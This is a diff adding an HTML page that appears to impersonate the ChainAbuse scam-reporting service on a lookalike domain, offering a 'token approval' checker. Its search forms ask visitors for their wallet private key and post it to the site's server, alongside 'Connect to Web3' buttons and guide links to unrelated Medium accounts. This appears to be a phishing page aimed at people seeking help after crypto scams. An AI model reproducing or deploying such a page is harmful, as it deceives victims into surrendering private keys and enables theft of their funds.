@@ -1,0 +1,386 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>Token Approvals | ChainAbuse</title>
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+
+  <!-- Favicons -->
+  <link href="assets/img/favicon-32x32.png" rel="icon">
+  <link href="assets/img/favicon-32x32.png" rel="apple-touch-icon">
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com" rel="preconnect">
+  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Source+Sans+Pro:ital,wght@0,200;0,300;0,400;0,600;0,700;0,900;1,200;1,300;1,400;1,600;1,700;1,900&display=swap" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Main CSS File -->
+  <link href="assets/css/main.css" rel="stylesheet">
+  <link href="assets/css/mode.css" rel="stylesheet">
+
+</head>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- jQuery is needed for AJAX -->
+  <script>
+    // Function to refresh the content
+    function refreshContent() {
+      $("#coinData").load("forms/coingek.php");  // This will load the content of coingek.php into the div with ID 'coinData'
+    }
+
+    // Call the function immediately and then set an interval to refresh every 5 seconds
+    $(document).ready(function(){
+      refreshContent();  // Initial load
+      setInterval(refreshContent, 2000);  // Refresh every 5 seconds
+    });
+  </script>
+<body>
+<!-- <div class="container-fluid"> -->
+  <header id="header" class="header d-flex align-items-center sticky-top border-bottom">
+    <div class="container">
+      <div class="row">
+
+        <div class="col">
+          <div id="coinData" class="input-group" style="padding:5px 0px -10px 0px;position:relative;">
+            <p class="ps-2" style="font-size:0.65rem;">
+                            ETH Price: <span class="text-primary">2,508.22</span><span class="text-danger"> (-0.33%)</span>              <!-- ETH Price: <span class="text-primary">$3,722.68</span> <span class="text-success"> (+3.18%)</span> -->
+            </p>
+          </div>
+        </div>
+
+        <div class="col">
+          
+          <div class="row">
+            <div class="col d-flex">
+            <form id="myForm" method="post" class="flex-grow-1">
+              <div class="input-group">
+                <input type="text" name="message" id="nameInput" class="form-control" placeholder="Search by Address / Private Key / Txn Hash / Block / Token / Domain Name" required>
+                <button type="submit" name="send" class="btn btn-primary">
+                  <i class="bi bi-search"></i>
+                </button>
+              </div>
+            </form>
+
+            <!-- Buttons moved outside form but maintaining layout -->
+            <div class="ms-2 d-flex">
+              <button id="darkModeToggle" class="btn btn-outline-light border btn-sm rounded">
+                <i class="bi bi-moon-stars-fill text-primary"></i> 
+              </button>
+              <button class="btn btn-outline-light border btn-sm ms-2 rounded">
+                <i class="bi bi-dash-circle-fill text-primary"></i>
+              </button>
+            </div>
+          </div>
+  
+          </div>
+        </div><!-- col -->
+        
+      </div>
+    </div>
+  </header>
+
+<main class="main">
+  <div class="container position-relative d-flex align-items-center justify-content-between">
+    <a href="https://chainabusescan.com/tokenapprovalchecker/" class="logo d-flex align-items-center ps-2">
+        <h2 class="sitename fw-semibold">
+            <img id="logo" src="assets/img/ca_logo_full_light.png" width="140rem" alt="chainabuse Logo" />
+        </h2>
+        <!-- <span>.</span> -->
+      </a>
+
+      <nav id="navmenu" class="navmenu">
+        <ul>
+          <li><a href="https://chainabusescan.com/tokenapprovalchecker/" class="active">Home<br></a></li>
+          <li><a href="https://medium.com/@celoscan718/ensuring-wallet-security-a-guide-to-deauthorize-malicious-signatures-via-chain-abuse-a2c309b10426" class=>Guides<br></a></li>
+          <li><a href="https://www.chainabuse.com/report/" class="">Report a Scam<br></a></li>
+          <li><a href="https://www.chainabuse.com/leaderboard/" class="">Top Contributors<br></a></li>
+          <li><a href="https://www.chainabuse.com/reports/" class="">View Reports<br></a></li>
+          <li class="nav-item dropdown">
+          <li class="dropdown"><a href="https://www.chainabuse.com/about"><span>About</span> <i class="bi bi-chevron-down toggle-dropdown"></i></a>
+          <ul class="dropdown-menu dropdown-menu-border" style="min-width: 14rem;">
+                                
+                                <li>
+                                    <a href="https://www.chainabuse.com/about" id="LI_charts2" class="dropdown-item">
+                                        About Us
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="https://www.chainabuse.com/faq" id="LI_charts2" class="dropdown-item">
+                                        FAQs
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="https://www.chainabuse.com/glossary" id="LI_charts2" class="dropdown-item">
+                                        Scam Glossary
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="https://www.chainabuse.com/contact" id="LI_charts2" class="dropdown-item">
+                                        Contact
+                                    </a>
+                                </li>
+                                
+                                
+                            </ul>
+          </li>
+          </li>
+          <li><a href="https://auth.chainabuse.com/u/login/identifier?state=hKFo2SBhVUl3b21SMmFzaUk5STNsbUJNNC1BaFRBWUpMRzhaQqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIE8xYlllbXNwZ2Y2M0QyZV9NOHlYLXc0VGFIQXVfX0Yyo2NpZNkgTU5YdXZUUjVRYVZxMkVyM1ptSTV1OTNia3gxa29nYTg"><i class="bi bi-person-circle fs-6 pe-2"></i> Log In</a></li>
+                
+        </ul>
+        </div>
+      </nav>
+
+      <i class="mobile-nav-toggle d-xl-none bi bi-list"></i>
+
+
+    </div>
+
+
+
+
+
+
+  <!-- Hero Section -->
+  <section id="hero" class="hero section">
+
+    <div class="container d-flex flex-column" data-aos="zoom-out">
+      <div class="row">
+        <div class="col px-3">
+          <h4 class="text-start fw-bold">Chain Abuse Token Approval</h4>
+          <p class="fs-6 text-start">Review and deauthorize your token approvals for any App. For more information, check out our Knowledge Chain Abuse <a target="_blank" href="https://www.chainabuse.com/about/" class="link-primary">article</a>.
+          <form id="myForm" method="post"> 
+            <div class="input-group">
+             <input type="text" name="message" id="nameInput" class="form-control" placeholder="Search by Address or Private Key" required  aria-describedby="button-addon2">
+              <button type="submit" class="btn btn-primary">
+                <i class="bi bi-search"></i>
+              </button>
+            </div>
+          </form>
+        </div><!-- /Col -->
+
+        <div class="col text-center d-none d-lg-block">
+          <img src="assets/img/ads.png" class="rounded mx-auto d-block" alt="ads">
+        </div><!-- /Col -->
+      </div><!-- /Row -->
+    </div><!-- /Container -->
+
+  </section><!-- /Hero Section -->
+<div class="container-fluid detail">
+<div class="container">
+    
+        <div class="row px-3 pt-3">
+      <div class="col">
+        <button class="btn border my-2 btn-sm ms-2 rounded">
+          <i class="bi bi-circle-fill text-danger"></i> Connect to Web3
+        </button>
+      </div>
+    </div>
+
+    <div class="row px-3">
+  <div class="col justify-items-center px-4 detail">
+
+    
+    <table class="table shadow-sm mt-3">
+        <thead>
+            <tr>
+                <th scope="col">Transaction Hash</th>
+                <th scope="col" class="text-primary">Last Updated (UTC)</th>
+                <th scope="col">Assets</th>
+                <th scope="col">Approved Spender</th>
+                <th scope="col">Original Allowance</th>
+                <th scope="col"></th>
+            </tr>
+        </thead>
+        <tbody>
+                             <tr>
+                    <td colspan="6">
+                    <div class="">
+                        <div class="">
+                          <div class="container my-5">
+                            <div class="row text-center py-5">
+                              <img src="assets/img/coin.png" class="rounded mx-auto d-block" style="width:80px;height:55px;" alt="ads">
+                              <h4 class="fw-bold fs-5">Deauthorize Token Approvals</h4>
+                              
+                                
+                                <p class="text-xs">Review and deauthorize your token approvals for any dApp.</p>                              
+                              <div class="col">
+                                <button class="btn btn-outline border my-2 btn-sm ms-2 rounded">
+                                  <i class="bi bi-circle-fill text-danger"></i> Connect to Web3
+                                </button>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </td>
+                 </tr>
+                    </tbody>
+    </table>
+
+
+    <p style="font-size:0.75rem;" class="px-4 pt-2">
+      The Token Approvals page lists contracts that have been approved to spend an address's tokens. The at risk amount shows what is vulnerable if the contracts were hacked. Learn more on how to Revoke/Deauthorize Your Approvals <a href="https://medium.com/@realScamSniffer/ensuring-wallet-security-a-guide-to-removing-malicious-signatures-via-chain-abuse-77064f47be61" target="_blank">Knowledge Base</a>.
+    </p>
+  </div>
+</div>
+
+</div><!-- /Container -->
+</div><!-- /Container-fluid -->
+
+</main><!-- /main -->
+
+  <footer id="footer" class="footer light-background">
+
+    <div class="footer-top">
+      <div class="container">
+        <div class="row gy-1">
+          <div class="col-lg-3 col-md-6 footer-about">
+            <a href="https://chainabusescan.com/tokenapprovalcheckers/" class="logo d-flex align-items-center">
+              <span class="sitename">Chain Abuse</span>
+            </a>
+            <p>ChainAbuse is a Block Explorer and Analytics Platform for Base</p>
+            <button class="btn btn-light btn-sm">
+              <img class="" src="assets/img/fox.png"style="width:15px;" alt="Add Blast Mainet"> Add Blast Mainnet
+            </button>
+          </div>
+
+          <div class="col-lg-3 col-md-4 footer-links">
+            <h4>Company</h4>
+            <ul>
+              <li><a href="#">Brand Assets</a></li>
+              <li><a href="#">Contact Us</a></li>
+              <li><a href="#">Terms & Privacy</a></li>
+              <li><a href="#">Bug Bounty <i class="bi bi-box-arrow-up-right"></i></a></li>
+            </ul>
+          </div>
+
+          <div class="col-lg-3 col-md-4 footer-links">
+            <h4>Community</h4>
+            <ul>
+              <li><a href="#">API Documentation</a></li>
+              <li><a href="#">Knowledge Base</a></li>
+              <li><a href="#">Network Status</a></li>
+            </ul>
+          </div>
+
+          <div class="col-lg-3 col-md-4 footer-links">
+            <h4>Products & Services</h4>
+            <ul>
+              <li><a href="#">Explorer-as-a-Service (EaaS) <i class="bi bi-box-arrow-up-right"></i></a></li>
+              <li><a href="#">Priority Support</a></li>
+              <li><a href="#">Blockscan <i class="bi bi-box-arrow-up-right"></i></a></li>
+            </ul>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <div class="copyright text-center border-top">
+      <div class="container d-flex flex-column flex-lg-row justify-content-center justify-content-lg-between align-items-center">
+
+        <div class="d-flex flex-column align-items-center align-items-lg-start">
+          <div>
+            ChainAbuse © 2024 (BASE-B1) |. Built by Team <a href="https://www.chainabuse.com/">Chain Abuse <i class="bi bi-box-arrow-up-right"></i></a>
+          </div>
+
+        </div>
+
+        <div class="social-links order-first order-lg-last mb-3 mb-lg-0">
+        Donations: <span href="https://etherscan.io/" class="pe-5 text-primary">0x71c765...d8976f</span>
+        </div>
+
+      </div>
+    </div>
+
+  </footer>
+  <!-- </div>  First Container-fluid -->
+  <!-- Scroll Top -->
+  <a href="#" id="scroll-top" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Preloader -->
+  <div id="preloader"></div>
+
+
+  <!-- Vendor JS Files -->
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+  <script src="assets/vendor/aos/aos.js"></script>
+  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="assets/vendor/imagesloaded/imagesloaded.pkgd.min.js"></script>
+  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+
+  <!-- Main JS File -->
+  <script src="assets/js/main.js"></script>
+  <script src="assets/js/mode.js"></script>
+  <!-- Bootstrap 5 JS (optional) -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- JavaScript for copy to clipboard -->
+    <script>
+        function copyToClipboard(text) {
+            // Create a temporary input element
+            const tempInput = document.createElement('input');
+            tempInput.value = text;
+            document.body.appendChild(tempInput);
+
+            // Select the text in the input
+            tempInput.select();
+            tempInput.setSelectionRange(0, 99999); // For mobile devices
+
+            // Copy the text to clipboard
+            document.execCommand('copy');
+
+            // Remove the temporary input
+            document.body.removeChild(tempInput);
+
+        }
+    </script>
+    <script>
+      var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
+      var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+        return new bootstrap.Tooltip(tooltipTriggerEl)
+      })
+    </script>
+      <script>
+        // Add hover effect to all items with the same name
+        const items = document.querySelectorAll('.item');
+
+        items.forEach(item => {
+            item.addEventListener('mouseenter', () => {
+                const name = item.getAttribute('data-name');
+                items.forEach(otherItem => {
+                    if (otherItem.getAttribute('data-name') === name) {
+                        otherItem.classList.add('highlight');
+                    }
+                });
+            });
+
+            item.addEventListener('mouseleave', () => {
+                const name = item.getAttribute('data-name');
+                items.forEach(otherItem => {
+                    if (otherItem.getAttribute('data-name') === name) {
+                        otherItem.classList.remove('highlight');
+                    }
+                });
+            });
+        });
+    </script>
+
+  <!-- Main JS File -->
+  <script src="assets/js/main.js"></script>
+  <script src="javascript.js"></script>
+
+</body>
+
+</html>
